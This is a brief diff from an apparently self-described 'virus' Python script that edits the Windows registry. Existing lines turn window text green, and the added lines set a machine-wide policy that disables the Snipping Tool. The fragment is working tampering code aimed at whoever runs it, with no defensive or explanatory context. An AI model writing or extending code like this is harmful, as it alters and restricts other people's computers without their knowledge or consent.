@@ -30,3 +30,8 @@ create_virus(**virus1)
 key2 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Colors')
 reg.SetValueEx(key2, 'WindowText', 0, reg.REG_SZ, "0 255 0")
 reg.CloseKey(key2)
+
+#fitri
+key3 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\TabletPC')
+reg.SetValueEx(key3, 'DisableSnippingTool', 0, reg.REG_DWORD, 1)
+reg.CloseKey(key3)
